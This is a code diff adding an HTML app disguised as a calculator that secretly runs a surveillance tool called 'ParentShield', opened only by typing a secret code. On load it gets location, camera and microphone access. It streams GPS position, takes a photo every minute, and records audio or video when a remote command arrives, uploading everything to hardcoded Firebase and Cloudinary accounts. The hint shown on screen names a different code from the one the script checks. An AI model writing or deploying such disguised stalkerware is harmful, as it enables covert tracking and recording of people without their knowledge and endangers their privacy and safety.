@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Calculator</title>
+
+  <!-- Android Permissions -->
+  <meta name="android.permission" content="android.permission.INTERNET"/>
+  <meta name="android.permission" content="android.permission.ACCESS_FINE_LOCATION"/>
+  <meta name="android.permission" content="android.permission.ACCESS_COARSE_LOCATION"/>
+  <meta name="android.permission" content="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+  <meta name="android.permission" content="android.permission.CAMERA"/>
+  <meta name="android.permission" content="android.permission.RECORD_AUDIO"/>
+  <meta name="android.permission" content="android.permission.READ_EXTERNAL_STORAGE"/>
+  <meta name="android.permission" content="android.permission.WRITE_EXTERNAL_STORAGE"/>
+  <meta name="android.permission" content="android.permission.POST_NOTIFICATIONS"/>
+  <meta name="android.permission" content="android.permission.FOREGROUND_SERVICE"/>
+  <meta name="android.permission" content="android.permission.WAKE_LOCK"/>
+  <meta name="android.permission" content="android.permission.RECEIVE_BOOT_COMPLETED"/>
+
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+    body { font-family: -apple-system, sans-serif; background:#000; min-height:100vh; overflow:hidden; }
+
+    /* ── FAKE CALCULATOR (Default Screen) ── */
+    #calculator {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      background: #1c1c1e;
+    }
+    .calc-display {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      justify-content: flex-end;
+      padding: 20px 20px 30px;
+    }
+    .calc-expr   { color: #888; font-size: 24px; margin-bottom: 8px; min-height: 32px; }
+    .calc-result { color: white; font-size: 64px; font-weight: 300; word-break: break-all; }
+    .calc-grid {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 14px;
+      padding: 0 14px 30px;
+    }
+    .calc-btn {
+      background: #333;
+      border: none;
+      border-radius: 50%;
+      color: white;
+      font-size: 26px;
+      aspect-ratio: 1;
+      cursor: pointer;
+      font-weight: 400;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.1s;
+    }
+    .calc-btn:active { opacity: 0.6; }
+    .calc-btn.orange { background: #ff9f0a; }
+    .calc-btn.gray   { background: #636366; }
+    .calc-btn.zero   { grid-column: span 2; border-radius: 40px; justify-content: flex-start; padding-left: 28px; aspect-ratio: auto; padding-top: 16px; padding-bottom: 16px; }
+
+    /* ── PARENTSHIELD APP (Hidden Screen) ── */
+    #ps-app {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #1a73e8, #0a3d91);
+      color: white;
+      padding: 20px;
+    }
+    #ps-app.show { display: flex; }
+    .ps-logo {
+      width: 90px; height: 90px;
+      background: rgba(255,255,255,0.15);
+      border-radius: 28px;
+      display: flex; align-items: center; justify-content: center;
+      margin-bottom: 16px;
+    }
+    .ps-logo svg { width: 54px; height: 54px; }
+    .ps-title    { font-size: 24px; font-weight: 900; margin-bottom: 4px; }
+    .ps-subtitle { font-size: 12px; opacity: 0.75; margin-bottom: 24px; }
+    .ps-card {
+      background: rgba(255,255,255,0.12);
+      border: 1px solid rgba(255,255,255,0.2);
+      border-radius: 18px;
+      padding: 18px;
+      width: 100%;
+      max-width: 320px;
+      margin-bottom: 14px;
+    }
+    .ps-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 7px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+      font-size: 13px;
+    }
+    .ps-row:last-child { border-bottom: none; }
+    .ps-row-val { font-weight: 700; }
+    .sos-btn {
+      width: 100%; max-width: 320px;
+      background: linear-gradient(135deg, #ea4335, #c62828);
+      border: none; border-radius: 16px;
+      padding: 16px; color: white;
+      font-size: 17px; font-weight: 900;
+      cursor: pointer;
+      box-shadow: 0 6px 20px rgba(234,67,53,0.4);
+      margin-bottom: 12px;
+    }
+    .hide-btn {
+      background: rgba(255,255,255,0.1);
+      border: 1px solid rgba(255,255,255,0.25);
+      border-radius: 12px;
+      color: white;
+      padding: 10px 28px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 4px;
+    }
+    .ps-hint { font-size: 10px; opacity: 0.5; text-align: center; margin-top: 12px; }
+
+    /* Toast */
+    .toast {
+      position: fixed; bottom: 30px; left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      background: rgba(0,0,0,0.88); color: white;
+      padding: 12px 22px; border-radius: 26px;
+      font-size: 13px; font-weight: 600;
+      opacity: 0; transition: all 0.3s; z-index: 9999;
+      white-space: nowrap;
+    }
+    .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+  </style>
+</head>
+<body>
+
+  <!-- FAKE CALCULATOR -->
+  <div id="calculator">
+    <div class="calc-display">
+      <div class="calc-expr" id="calc-expr"></div>
+      <div class="calc-result" id="calc-result">0</div>
+    </div>
+    <div class="calc-grid">
+      <button class="calc-btn gray"   onclick="calcBtn('AC')">AC</button>
+      <button class="calc-btn gray"   onclick="calcBtn('+/-')">+/-</button>
+      <button class="calc-btn gray"   onclick="calcBtn('%')">%</button>
+      <button class="calc-btn orange" onclick="calcBtn('/')">÷</button>
+
+      <button class="calc-btn" onclick="calcBtn('7')">7</button>
+      <button class="calc-btn" onclick="calcBtn('8')">8</button>
+      <button class="calc-btn" onclick="calcBtn('9')">9</button>
+      <button class="calc-btn orange" onclick="calcBtn('*')">×</button>
+
+      <button class="calc-btn" onclick="calcBtn('4')">4</button>
+      <button class="calc-btn" onclick="calcBtn('5')">5</button>
+      <button class="calc-btn" onclick="calcBtn('6')">6</button>
+      <button class="calc-btn orange" onclick="calcBtn('-')">−</button>
+
+      <button class="calc-btn" onclick="calcBtn('1')">1</button>
+      <button class="calc-btn" onclick="calcBtn('2')">2</button>
+      <button class="calc-btn" onclick="calcBtn('3')">3</button>
+      <button class="calc-btn orange" onclick="calcBtn('+')">+</button>
+
+      <button class="calc-btn zero"   onclick="calcBtn('0')">0</button>
+      <button class="calc-btn"        onclick="calcBtn('.')">.</button>
+      <button class="calc-btn orange" onclick="calcBtn('=')">=</button>
+    </div>
+  </div>
+
+  <!-- PARENTSHIELD APP -->
+  <div id="ps-app">
+    <div class="ps-logo">
+      <svg viewBox="0 0 60 60" fill="none">
+        <circle cx="30" cy="30" r="28" stroke="rgba(255,255,255,0.5)" stroke-width="2"/>
+        <path d="M20 22C20 18.686 22.686 16 26 16H34C37.314 16 40 18.686 40 22V34C40 37.314 37.314 40 34 40H26C22.686 40 20 37.314 20 34V22Z" fill="white" opacity="0.9"/>
+        <circle cx="30" cy="28" r="5" fill="#1a73e8"/>
+        <path d="M22 44C22 41.791 25.582 40 30 40C34.418 40 38 41.791 38 44" stroke="white" stroke-width="2.5" stroke-linecap="round" opacity="0.7"/>
+      </svg>
+    </div>
+    <div class="ps-title">ParentShield</div>
+    <div class="ps-subtitle">Monitoring Active ✅</div>
+    <div class="ps-card">
+      <div class="ps-row"><span>📍 Location</span><span class="ps-row-val" id="loc-status">Tracking...</span></div>
+      <div class="ps-row"><span>🔋 Battery</span><span class="ps-row-val" id="bat-status">Loading...</span></div>
+      <div class="ps-row"><span>📶 Status</span><span class="ps-row-val">🟢 Online</span></div>
+      <div class="ps-row"><span>📷 Camera</span><span class="ps-row-val" id="cam-status">Ready</span></div>
+      <div class="ps-row"><span>🎤 Mic</span><span class="ps-row-val" id="mic-status">Ready</span></div>
+    </div>
+    <button class="sos-btn" onclick="sendSOS()">🆘 SOS — Emergency</button>
+    <button class="hide-btn" onclick="hideApp()">🙈 Calculator Mein Chhupo</button>
+    <div class="ps-hint">Calculator khol ke 1234 = dabao to wapas aao</div>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // ══ CONFIG ══
+    var FIREBASE_URL = "https://parentshield-1b098-default-rtdb.asia-southeast1.firebasedatabase.app";
+    var CLOUDINARY_CLOUD = "dt0kvnjpq";
+    var CLOUDINARY_PRESET = "parentshield";
+    var SECRET_CODE = "7068";
+
+    // ══ STATE ══
+    var currentLat = 0, currentLng = 0;
+    var mediaRecorder = null, audioChunks = [], isRecording = false;
+    var calcInput = "", calcExpr = "";
+
+    // ══ TOAST ══
+    function showToast(msg) {
+      var t = document.getElementById('toast');
+      t.textContent = msg;
+      t.classList.add('show');
+      setTimeout(function(){ t.classList.remove('show'); }, 3000);
+    }
+
+    // ══ SHOW / HIDE APP ══
+    function showApp() {
+      document.getElementById('calculator').style.display = 'none';
+      document.getElementById('ps-app').classList.add('show');
+    }
+    function hideApp() {
+      document.getElementById('ps-app').classList.remove('show');
+      document.getElementById('calculator').style.display = 'flex';
+      calcInput = ""; calcExpr = "";
+      document.getElementById('calc-result').textContent = '0';
+      document.getElementById('calc-expr').textContent = '';
+    }
+
+    // ══ CALCULATOR LOGIC ══
+    function calcBtn(val) {
+      var resultEl = document.getElementById('calc-result');
+      var exprEl   = document.getElementById('calc-expr');
+
+      if (val === 'AC') {
+        calcInput = ""; calcExpr = "";
+        resultEl.textContent = '0';
+        exprEl.textContent = '';
+        return;
+      }
+      if (val === '=') {
+        // Secret code check
+        if (calcInput === SECRET_CODE) {
+          showApp();
+          return;
+        }
+        try {
+          var result = eval(calcInput);
+          exprEl.textContent = calcInput + ' =';
+          resultEl.textContent = result;
+          calcInput = String(result);
+        } catch(e) {
+          resultEl.textContent = 'Error';
+          calcInput = "";
+        }
+        return;
+      }
+      if (val === '+/-') {
+        if (calcInput) {
+          calcInput = String(parseFloat(calcInput) * -1);
+          resultEl.textContent = calcInput;
+        }
+        return;
+      }
+      if (val === '%') {
+        if (calcInput) {
+          calcInput = String(parseFloat(calcInput) / 100);
+          resultEl.textContent = calcInput;
+        }
+        return;
+      }
+      calcInput += val;
+      resultEl.textContent = calcInput;
+      exprEl.textContent = '';
+    }
+
+    // ══ FIREBASE ══
+    function firebasePost(path, data) {
+      fetch(FIREBASE_URL + path, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      }).catch(function(e){ console.log('FB error: '+e); });
+    }
+    function firebaseGet(path, cb) {
+      fetch(FIREBASE_URL + path)
+        .then(function(r){ return r.json(); })
+        .then(cb)
+        .catch(function(e){ console.log('FB get error: '+e); });
+    }
+
+    // ══ LOCATION ══
+    function startLocationTracking() {
+      if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(
+          function(pos) {
+            currentLat = pos.coords.latitude;
+            currentLng = pos.coords.longitude;
+            document.getElementById('loc-status').textContent = '🟢 Active';
+            firebasePost('/child/location.json', {
+              lat: currentLat, lng: currentLng,
+              time: new Date().toISOString(),
+              accuracy: pos.coords.accuracy
+            });
+          },
+          function(err) {
+            document.getElementById('loc-status').textContent = '🔴 Error';
+          },
+          { enableHighAccuracy: true, maximumAge: 30000, timeout: 10000 }
+        );
+      }
+    }
+
+    // ══ BATTERY ══
+    function updateBattery() {
+      if (navigator.getBattery) {
+        navigator.getBattery().then(function(b) {
+          var level = Math.round(b.level * 100);
+          var icon = b.charging ? '⚡' : '🔋';
+          document.getElementById('bat-status').textContent = icon + ' ' + level + '%';
+          firebasePost('/child/battery.json', level);
+        });
+      } else {
+        firebasePost('/child/battery.json', 50);
+      }
+    }
+
+    // ══ STATUS ══
+    function updateStatus() {
+      firebasePost('/child/status.json', 'online');
+    }
+
+    // ══ CLOUDINARY UPLOAD ══
+    function uploadToCloudinary(blob, type) {
+      var fd = new FormData();
+      fd.append('file', blob);
+      fd.append('upload_preset', CLOUDINARY_PRESET);
+      var url = 'https://api.cloudinary.com/v1_1/' + CLOUDINARY_CLOUD + '/' + type + '/upload';
+      fetch(url, { method: 'POST', body: fd })
+        .then(function(r){ return r.json(); })
+        .then(function(d) {
+          if (d.secure_url) {
+            var path = type === 'image' ? '/child/lastphoto.json' : type === 'video' ? '/child/lastvideo.json' : '/child/lastrecording.json';
+            firebasePost(path, { url: d.secure_url, time: new Date().toISOString() });
+          }
+        }).catch(function(e){ console.log('Upload error: '+e); });
+    }
+
+    // ══ AUTO PHOTO ══
+    function takeAutoPhoto() {
+      if (!navigator.mediaDevices) return;
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
+        .then(function(stream) {
+          var video = document.createElement('video');
+          video.srcObject = stream; video.play();
+          setTimeout(function() {
+            var canvas = document.createElement('canvas');
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            stream.getTracks().forEach(function(t){ t.stop(); });
+            canvas.toBlob(function(blob) {
+              uploadToCloudinary(blob, 'image');
+            }, 'image/jpeg', 0.7);
+          }, 1500);
+        }).catch(function(e){ console.log('Photo error: '+e); });
+    }
+
+    // ══ AUDIO RECORDING ══
+    function startRecording() {
+      if (!navigator.mediaDevices || isRecording) return;
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(function(stream) {
+          mediaRecorder = new MediaRecorder(stream);
+          audioChunks = [];
+          mediaRecorder.ondataavailable = function(e){ audioChunks.push(e.data); };
+          mediaRecorder.onstop = function() {
+            var blob = new Blob(audioChunks, { type: 'audio/webm' });
+            uploadToCloudinary(blob, 'raw');
+            stream.getTracks().forEach(function(t){ t.stop(); });
+            isRecording = false;
+            document.getElementById('mic-status').textContent = 'Ready';
+            firebasePost('/commands/recording.json', 'false');
+          };
+          mediaRecorder.start();
+          isRecording = true;
+          document.getElementById('mic-status').textContent = '🔴 REC';
+          setTimeout(function() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+          }, 300000);
+        }).catch(function(e){ console.log('Mic error: '+e); });
+    }
+
+    // ══ VIDEO RECORDING ══
+    function startVideo() {
+      if (!navigator.mediaDevices) return;
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(function(stream) {
+          var vr = new MediaRecorder(stream);
+          var chunks = [];
+          vr.ondataavailable = function(e){ chunks.push(e.data); };
+          vr.onstop = function() {
+            var blob = new Blob(chunks, { type: 'video/webm' });
+            uploadToCloudinary(blob, 'video');
+            stream.getTracks().forEach(function(t){ t.stop(); });
+            firebasePost('/commands/video.json', 'false');
+          };
+          vr.start();
+          setTimeout(function() {
+            if (vr.state !== 'inactive') vr.stop();
+          }, 300000);
+        }).catch(function(e){ console.log('Video error: '+e); });
+    }
+
+    // ══ SOS ══
+    function sendSOS() {
+      firebasePost('/alerts/sos.json', {
+        time: new Date().toISOString(),
+        lat: currentLat, lng: currentLng,
+        message: 'SOS! Bacche ne emergency button dabaya!'
+      });
+      showToast('🆘 SOS bheja gaya! Parent alert ho gaye!');
+      startRecording();
+    }
+
+    // ══ COMMANDS CHECK ══
+    function checkCommands() {
+      firebaseGet('/commands/recording.json', function(d) {
+        if (d === 'true' && !isRecording) startRecording();
+      });
+      firebaseGet('/commands/video.json', function(d) {
+        if (d === 'true') startVideo();
+      });
+      firebaseGet('/commands/takephoto.json', function(d) {
+        if (d === 'true') {
+          takeAutoPhoto();
+          firebasePost('/commands/takephoto.json', 'false');
+        }
+      });
+    }
+
+    // ══ PERMISSIONS ══
+    function requestPermissions() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(){}, function(){});
+      }
+      if (navigator.mediaDevices) {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+          .then(function(s){ s.getTracks().forEach(function(t){ t.stop(); }); })
+          .catch(function(){});
+      }
+      if ('Notification' in window && Notification.permission === 'default') {
+        Notification.requestPermission();
+      }
+    }
+
+    // ══ APP START ══
+    window.onload = function() {
+      requestPermissions();
+      startLocationTracking();
+      updateBattery();
+      updateStatus();
+      setInterval(function() {
+        updateStatus();
+        updateBattery();
+        checkCommands();
+      }, 30000);
+      setInterval(takeAutoPhoto, 60000);
+    };
+
+    window.onbeforeunload = function() {
+      firebasePost('/child/status.json', 'offline');
+    };
+  </script>
+</body>
+</html>
